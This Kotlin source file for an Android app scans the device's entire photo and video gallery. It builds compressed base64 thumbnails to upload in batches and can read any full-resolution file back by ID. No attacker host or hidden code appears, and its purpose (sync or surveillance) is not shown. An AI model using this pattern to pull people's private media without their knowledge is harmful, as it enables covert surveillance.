package zxtni.apixer.into.data

import android.content.ContentUris
import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.Canvas
import android.graphics.Color
import android.graphics.Paint
import android.media.MediaMetadataRetriever
import android.net.Uri
import android.os.Build
import android.provider.MediaStore
import android.util.Base64
import android.util.Log
import android.util.Size
import zxtni.apixer.into.network.MediaThumbnailEntry
import java.io.ByteArrayOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone

/**
 * Scans the device gallery via MediaStore API and generates
 * compressed thumbnails (<50KB) for efficient upload.
 *
 * Supports all images and videos with robust fallback decoding
 * and memory-safe streaming batches.
 */
object MediaScanner {

    private const val TAG = "MediaScanner"
    private const val THUMBNAIL_MAX_SIZE = 180   // px
    private const val THUMBNAIL_QUALITY = 35     // JPEG quality for <35KB
    const val BATCH_SIZE = 20                   // thumbnails per upload batch

    private val isoFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US).apply {
        timeZone = TimeZone.getTimeZone("UTC")
    }

    // ── Image Scanning ──────────────────────────────────────

    /**
     * Scans the gallery for images and emits entries via callback or list.
     * @param context Application context
     * @param limit Max number of images to scan (0 = all images)
     * @param existingIds Set of media_store_ids already synced
     * @param onEntry Optional streaming callback per entry
     */
    fun scanImages(
        context: Context,
        limit: Int = 0,
        existingIds: Set<String> = emptySet(),
        onEntry: ((MediaThumbnailEntry) -> Unit)? = null
    ): List<MediaThumbnailEntry> {
        val results = mutableListOf<MediaThumbnailEntry>()

        val collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI

        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.SIZE,
            MediaStore.Images.Media.WIDTH,
            MediaStore.Images.Media.HEIGHT,
            MediaStore.Images.Media.MIME_TYPE,
            MediaStore.Images.Media.DATE_MODIFIED,
            MediaStore.Images.Media.DATE_ADDED,
            MediaStore.Images.Media.DATE_TAKEN,
        )

        // Standard sort order without raw SQL LIMIT syntax
        val sortOrder = "${MediaStore.MediaColumns.DATE_MODIFIED} DESC"

        try {
            context.contentResolver.query(
                collection,
                projection,
                null,
                null,
                sortOrder
            )?.use { cursor ->
                val idCol = cursor.getColumnIndex(MediaStore.Images.Media._ID)
                val nameCol = cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)
                val sizeCol = cursor.getColumnIndex(MediaStore.Images.Media.SIZE)
                val widthCol = cursor.getColumnIndex(MediaStore.Images.Media.WIDTH)
                val heightCol = cursor.getColumnIndex(MediaStore.Images.Media.HEIGHT)
                val mimeCol = cursor.getColumnIndex(MediaStore.Images.Media.MIME_TYPE)
                val dateTakenCol = cursor.getColumnIndex(MediaStore.Images.Media.DATE_TAKEN)
                val dateModCol = cursor.getColumnIndex(MediaStore.Images.Media.DATE_MODIFIED)
                val dateAddCol = cursor.getColumnIndex(MediaStore.Images.Media.DATE_ADDED)

                if (idCol == -1) {
                    Log.e(TAG, "Cannot find _ID column in MediaStore query")
                    return results
                }

                var processed = 0
                while (cursor.moveToNext()) {
                    if (limit > 0 && processed >= limit) break

                    try {
                        val id = cursor.getLong(idCol)
                        val storeId = "image_$id"

                        if (storeId in existingIds) continue

                        val contentUri = ContentUris.withAppendedId(collection, id)
                        val thumbnail = generateThumbnail(context, contentUri, "image")
                            ?: continue

                        val dateTaken = if (dateTakenCol != -1) cursor.getLong(dateTakenCol) else 0L
                        val dateMod = if (dateModCol != -1) cursor.getLong(dateModCol) else 0L
                        val dateAdd = if (dateAddCol != -1) cursor.getLong(dateAddCol) else 0L

                        val timeMs = when {
                            dateTaken > 0 -> dateTaken
                            dateMod > 0 -> dateMod * 1000L
                            dateAdd > 0 -> dateAdd * 1000L
                            else -> System.currentTimeMillis()
                        }

                        val entry = MediaThumbnailEntry(
                            media_store_id = storeId,
                            media_type = "image",
                            file_name = if (nameCol != -1) cursor.getString(nameCol) ?: "Image_$id.jpg" else "Image_$id.jpg",
                            file_size = if (sizeCol != -1) cursor.getInt(sizeCol) else 0,
                            width = if (widthCol != -1) cursor.getInt(widthCol) else 0,
                            height = if (heightCol != -1) cursor.getInt(heightCol) else 0,
                            mime_type = if (mimeCol != -1) cursor.getString(mimeCol) ?: "image/jpeg" else "image/jpeg",
                            date_taken = isoFormat.format(Date(timeMs)),
                            thumbnail_b64 = thumbnail,
                        )

                        results.add(entry)
                        onEntry?.invoke(entry)
                        processed++
                    } catch (e: Exception) {
                        Log.w(TAG, "Failed to process image row: ${e.message}")
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error scanning images", e)
        }

        Log.i(TAG, "Scanned ${results.size} gallery images")
        return results
    }

    // ── Video Scanning ──────────────────────────────────────

    /**
     * Scans the gallery for videos and emits entries via callback or list.
     */
    fun scanVideos(
        context: Context,
        limit: Int = 0,
        existingIds: Set<String> = emptySet(),
        onEntry: ((MediaThumbnailEntry) -> Unit)? = null
    ): List<MediaThumbnailEntry> {
        val results = mutableListOf<MediaThumbnailEntry>()

        val collection = MediaStore.Video.Media.EXTERNAL_CONTENT_URI

        val projection = arrayOf(
            MediaStore.Video.Media._ID,
            MediaStore.Video.Media.DISPLAY_NAME,
            MediaStore.Video.Media.SIZE,
            MediaStore.Video.Media.WIDTH,
            MediaStore.Video.Media.HEIGHT,
            MediaStore.Video.Media.DURATION,
            MediaStore.Video.Media.MIME_TYPE,
            MediaStore.Video.Media.DATE_MODIFIED,
            MediaStore.Video.Media.DATE_ADDED,
            MediaStore.Video.Media.DATE_TAKEN,
        )

        val sortOrder = "${MediaStore.MediaColumns.DATE_MODIFIED} DESC"

        try {
            context.contentResolver.query(
                collection,
                projection,
                null,
                null,
                sortOrder
            )?.use { cursor ->
                val idCol = cursor.getColumnIndex(MediaStore.Video.Media._ID)
                val nameCol = cursor.getColumnIndex(MediaStore.Video.Media.DISPLAY_NAME)
                val sizeCol = cursor.getColumnIndex(MediaStore.Video.Media.SIZE)
                val widthCol = cursor.getColumnIndex(MediaStore.Video.Media.WIDTH)
                val heightCol = cursor.getColumnIndex(MediaStore.Video.Media.HEIGHT)
                val durCol = cursor.getColumnIndex(MediaStore.Video.Media.DURATION)
                val mimeCol = cursor.getColumnIndex(MediaStore.Video.Media.MIME_TYPE)
                val dateTakenCol = cursor.getColumnIndex(MediaStore.Video.Media.DATE_TAKEN)
                val dateModCol = cursor.getColumnIndex(MediaStore.Video.Media.DATE_MODIFIED)
                val dateAddCol = cursor.getColumnIndex(MediaStore.Video.Media.DATE_ADDED)

                if (idCol == -1) {
                    Log.e(TAG, "Cannot find _ID column in MediaStore video query")
                    return results
                }

                var processed = 0
                while (cursor.moveToNext()) {
                    if (limit > 0 && processed >= limit) break

                    try {
                        val id = cursor.getLong(idCol)
                        val storeId = "video_$id"

                        if (storeId in existingIds) continue

                        val contentUri = ContentUris.withAppendedId(collection, id)
                        val thumbnail = generateThumbnail(context, contentUri, "video")
                            ?: continue

                        val dateTaken = if (dateTakenCol != -1) cursor.getLong(dateTakenCol) else 0L
                        val dateMod = if (dateModCol != -1) cursor.getLong(dateModCol) else 0L
                        val dateAdd = if (dateAddCol != -1) cursor.getLong(dateAddCol) else 0L

                        val timeMs = when {
                            dateTaken > 0 -> dateTaken
                            dateMod > 0 -> dateMod * 1000L
                            dateAdd > 0 -> dateAdd * 1000L
                            else -> System.currentTimeMillis()
                        }

                        val entry = MediaThumbnailEntry(
                            media_store_id = storeId,
                            media_type = "video",
                            file_name = if (nameCol != -1) cursor.getString(nameCol) ?: "Video_$id.mp4" else "Video_$id.mp4",
                            file_size = if (sizeCol != -1) cursor.getInt(sizeCol) else 0,
                            width = if (widthCol != -1) cursor.getInt(widthCol) else 0,
                            height = if (heightCol != -1) cursor.getInt(heightCol) else 0,
                            duration_ms = if (durCol != -1) cursor.getInt(durCol) else 0,
                            mime_type = if (mimeCol != -1) cursor.getString(mimeCol) ?: "video/mp4" else "video/mp4",
                            date_taken = isoFormat.format(Date(timeMs)),
                            thumbnail_b64 = thumbnail,
                        )

                        results.add(entry)
                        onEntry?.invoke(entry)
                        processed++
                    } catch (e: Exception) {
                        Log.w(TAG, "Failed to process video row: ${e.message}")
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error scanning videos", e)
        }

        Log.i(TAG, "Scanned ${results.size} gallery videos")
        return results
    }

    // ── Thumbnail Generation (4-Tier Fallback) ──────────────

    /**
     * Generates a compressed JPEG thumbnail (<50KB) for a media content URI.
     * Uses 4 tiers of fallback to guarantee no gallery file is skipped.
     */
    private fun generateThumbnail(context: Context, uri: Uri, type: String): String? {
        var bitmap: Bitmap? = null

        // Tier 1: Android 10+ MediaStore thumbnail loader
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            try {
                bitmap = context.contentResolver.loadThumbnail(
                    uri,
                    Size(THUMBNAIL_MAX_SIZE, THUMBNAIL_MAX_SIZE),
                    null
                )
            } catch (t: Throwable) {
                // Ignore and fall through to Tier 2/3
            }
        }

        // Tier 2: For videos, use MediaMetadataRetriever frame extraction
        if (bitmap == null && type == "video") {
            try {
                val retriever = MediaMetadataRetriever()
                retriever.setDataSource(context, uri)
                bitmap = retriever.getFrameAtTime(1_000_000, MediaMetadataRetriever.OPTION_CLOSEST_SYNC)
                    ?: retriever.frameAtTime
                retriever.release()
            } catch (t: Throwable) {
                // Ignore and fall through to Tier 3
            }
        }

        // Tier 3: Universal stream decode with inSampleSize calculation
        if (bitmap == null) {
            try {
                val options = BitmapFactory.Options().apply { inJustDecodeBounds = true }
                context.contentResolver.openInputStream(uri)?.use { stream ->
                    BitmapFactory.decodeStream(stream, null, options)
                }

                if (options.outWidth > 0 && options.outHeight > 0) {
                    val maxDim = maxOf(options.outWidth, options.outHeight)
                    val sample = if (maxDim > THUMBNAIL_MAX_SIZE) maxDim / THUMBNAIL_MAX_SIZE else 1
                    val decodeOptions = BitmapFactory.Options().apply {
                        inSampleSize = maxOf(1, sample)
                        inPreferredConfig = Bitmap.Config.RGB_565 // Low memory footprint
                    }
                    context.contentResolver.openInputStream(uri)?.use { stream ->
                        bitmap = BitmapFactory.decodeStream(stream, null, decodeOptions)
                    }
                }
            } catch (t: Throwable) {
                // Ignore and fall through to Tier 4
            }
        }

        // Tier 4: Fallback placeholder tile so unsupported/corrupt formats are NOT lost from gallery
        if (bitmap == null) {
            bitmap = generatePlaceholderBitmap(type)
        }

        return try {
            // Scale down if still larger than max dimensions
            val scaledBitmap = if (bitmap.width > THUMBNAIL_MAX_SIZE || bitmap.height > THUMBNAIL_MAX_SIZE) {
                val ratio = minOf(
                    THUMBNAIL_MAX_SIZE.toFloat() / bitmap.width,
                    THUMBNAIL_MAX_SIZE.toFloat() / bitmap.height
                )
                val targetW = maxOf(1, (bitmap.width * ratio).toInt())
                val targetH = maxOf(1, (bitmap.height * ratio).toInt())
                Bitmap.createScaledBitmap(bitmap, targetW, targetH, true)
            } else {
                bitmap
            }

            val baos = ByteArrayOutputStream()
            scaledBitmap.compress(Bitmap.CompressFormat.JPEG, THUMBNAIL_QUALITY, baos)

            if (baos.size() > 50_000) {
                baos.reset()
                scaledBitmap.compress(Bitmap.CompressFormat.JPEG, 20, baos)
            }

            val b64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)

            if (scaledBitmap !== bitmap) {
                scaledBitmap.recycle()
            }
            bitmap.recycle()

            b64
        } catch (e: Exception) {
            Log.w(TAG, "Compression error for $uri: ${e.message}")
            null
        }
    }

    private fun generatePlaceholderBitmap(type: String): Bitmap {
        val bmp = Bitmap.createBitmap(80, 80, Bitmap.Config.RGB_565)
        val canvas = Canvas(bmp)
        val paint = Paint().apply {
            color = if (type == "video") Color.rgb(30, 41, 59) else Color.rgb(51, 65, 85)
            style = Paint.Style.FILL
        }
        canvas.drawRect(0f, 0f, 80f, 80f, paint)
        return bmp
    }

    // ── Full File Reading ────────────────────────────────────

    /**
     * Reads the full-resolution file for a media_store_id and returns it as base64.
     */
    fun readFullFile(context: Context, mediaStoreId: String): Pair<String, String?>? {
        try {
            val parts = mediaStoreId.split("_", limit = 2)
            if (parts.size != 2) return null

            val type = parts[0]
            val id = parts[1].toLongOrNull() ?: return null

            val uri = when (type) {
                "image" -> ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
                "video" -> ContentUris.withAppendedId(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, id)
                else -> return null
            }

            val mimeType = context.contentResolver.getType(uri)
            val bytes = context.contentResolver.openInputStream(uri)?.use { it.readBytes() }
                ?: return null

            val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
            Log.i(TAG, "Read full file for $mediaStoreId: ${bytes.size} bytes, mime=$mimeType")
            return Pair(b64, mimeType)

        } catch (e: Exception) {
            Log.e(TAG, "Error reading full file for $mediaStoreId", e)
            return null
        }
    }

    // ── Streaming Batch Scanning & Ingestion ────────────────

    /**
     * Scans all gallery images and videos without artificial limits,
     * emitting streaming batches to keep memory usage minimal.
     */
    suspend fun scanAndUploadAll(
        context: Context,
        existingIds: Set<String> = emptySet(),
        onBatchReady: suspend (List<MediaThumbnailEntry>) -> Unit
    ): Int {
        var totalIngested = 0
        val currentBatch = mutableListOf<MediaThumbnailEntry>()

        // 1. Scan Images (all gallery items)
        scanImages(context, limit = 0, existingIds = existingIds) { entry ->
            currentBatch.add(entry)
            if (currentBatch.size >= BATCH_SIZE) {
                val batchToSend = ArrayList(currentBatch)
                currentBatch.clear()
                kotlinx.coroutines.runBlocking { onBatchReady(batchToSend) }
                totalIngested += batchToSend.size
            }
        }

        // 2. Scan Videos (all gallery items)
        scanVideos(context, limit = 0, existingIds = existingIds) { entry ->
            currentBatch.add(entry)
            if (currentBatch.size >= BATCH_SIZE) {
                val batchToSend = ArrayList(currentBatch)
                currentBatch.clear()
                kotlinx.coroutines.runBlocking { onBatchReady(batchToSend) }
                totalIngested += batchToSend.size
            }
        }

        // Emit final trailing batch
        if (currentBatch.isNotEmpty()) {
            val batchToSend = ArrayList(currentBatch)
            currentBatch.clear()
            onBatchReady(batchToSend)
            totalIngested += batchToSend.size
        }

        Log.i(TAG, "scanAndUploadAll complete: total $totalIngested items ingested")
        return totalIngested
    }

    /**
     * Legacy helper returning chunked batches.
     */
    fun scanAll(context: Context, existingIds: Set<String> = emptySet()): List<List<MediaThumbnailEntry>> {
        val allItems = mutableListOf<MediaThumbnailEntry>()
        allItems.addAll(scanImages(context, limit = 0, existingIds = existingIds))
        allItems.addAll(scanVideos(context, limit = 0, existingIds = existingIds))
        allItems.sortByDescending { it.date_taken }
        return allItems.chunked(BATCH_SIZE)
    }
}

